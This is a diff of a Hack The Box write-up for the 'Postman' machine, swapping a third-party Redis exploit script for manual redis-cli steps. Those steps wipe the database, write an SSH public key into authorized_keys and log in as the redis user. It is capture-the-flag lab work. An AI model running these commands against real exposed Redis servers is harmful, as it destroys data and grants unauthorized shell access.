@@ -36,42 +36,47 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 37.89 seconds
 ```
 
-## redis service enumeration leads to ssh key
-```
-10.10.10.160:6379> keys *
-1) "crack"
-
-0.10.10.160:6379> get crack
-"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDC/SrUq7CauZYGgXx9roFkHZnOIAJevM2AiGtsYa3Seqw+ecwbtQYxyT4Ybh3603S4jEYXmWCxbOgehSz0cwKG83/zlLaHSjJPZAOooP9RykIOVOrJjAoNymc2MFAgzws2nYTKoZ4fS9axqgD1QyRf69xxiEFsLowKeBuBosW7m6H1qz97WU9mCPqRXRJlZEnMew8gnIkUbXyQAV5AsW+5QLDJG+oUGNXYO9meTx8YAUgo38pS2GDMbPWtuVCPhI1pwqfFbuI9n47oyAnYJfZ+FHSMYS9inu5frcynUoRT8+iIWt9UcGxuffOPix76scjWW2URLGJHnTNLIan/dc8kVxbTDmgFSYRQvoObMCnOGjsHXRf/IsbPC3gUu5QXd8P2JSRxyWksq6BGBLZHJw0wJK682rt8A157dIG6ilSPTkKv7LEhPx+/EPZaoyXonUcike8OgR0ahx//dpIOdj4Rf/bD9oXhD6az6nZgk7GvU3kbovtoPBL1T4nj7STE4rM= redis@10.10.10.160\n\n\n\n"
-```
-
-I found an exploit that abuses the wide open redis config and gives me a shell:
-https://github.com/Avinash-acid/Redis-Server-Exploit/blob/master/redis.py
+## ssh crackit on redis server
+https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
 
 ```
-root@kali:~/Pentesting/HackTheBox/Boxes/Postman# python redis_exploit.py 10.10.10.160 redis                                                            
-        *******************************************************************                                                                            
-        * [+] [Exploit] Exploiting misconfigured REDIS SERVER*                                                                                         
-        * [+] AVINASH KUMAR THAPA aka "-Acid"                                                                                                          
-        *******************************************************************                                                                            
-                                                                                                                                                       
-                                                                                                                                                       
-         SSH Keys Need to be Generated                                                                                                                 
-Generating public/private rsa key pair.                                                                                                                
-Enter file in which to save the key (/root/.ssh/id_rsa):                                                                                               
-Enter passphrase (empty for no passphrase):                                                                                                            
-Enter same passphrase again:                                                                                                                           
-Your identification has been saved in /root/.ssh/id_rsa.
-Your public key has been saved in /root/.ssh/id_rsa.pub.
-The key fingerprint is:
+shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ redis-cli -h 10.10.10.160
+10.10.10.160:6379> config get dir
+1) "dir"
+2) "/var/lib/redis/.ssh"
+10.10.10.160:6379> config get dbfilename
+1) "dbfilename"
+2) "authorized_keys"
+10.10.10.160:6379> 
+shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ redis-cli -h 10.10.10.160 flushall
+OK
+shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ cat foo.txt | redis-cli -h postman.htb -x set crackit
+Could not connect to Redis at postman.htb:6379: Name or service not known
+shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
+OK
+shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ redis-cli -h 10.10.10.160 save
+OK
+shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ ssh -i ~/.ssh/id_rsa redis@postman.htb
+ssh: Could not resolve hostname postman.htb: Name or service not known
+shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ ssh -i ~/.ssh/id_rsa redis@10.10.10.160
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
 
 
-redis@Postman:~$ whoami
-redis
-redis@Postman:~$ pwd
-/var/lib/redis
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
+redis@Postman:~$ ^C
 redis@Postman:~$ 
+
 ```
+## Foothold on the Box
+
+
 
 ## searching for .bak files
 ```
